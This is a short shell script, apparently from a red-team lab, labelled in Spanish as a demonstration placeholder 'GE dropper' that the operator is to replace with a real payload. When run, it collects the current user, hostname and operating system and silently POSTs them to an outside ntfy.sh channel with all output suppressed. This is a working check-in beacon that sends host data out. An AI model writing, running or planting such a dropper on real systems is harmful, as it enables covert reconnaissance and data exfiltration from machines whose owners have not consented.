#!/bin/sh
# GE dropper (placeholder de demostración). El operador reemplaza con el payload nativo real.
echo "[GE] dropper ejecutado en: $(whoami)@$(hostname 2>/dev/null || echo unknown) [$(uname -s)]"
echo "[GE] reporting back to operador..."
curl -s -X POST -d "{\"host\":\"$(hostname)\",\"user\":\"$(whoami)\",\"os\":\"$(uname -s)\"}" "https://ntfy.sh/redlab-ge-7x3k9m2" >/dev/null 2>&1 || true
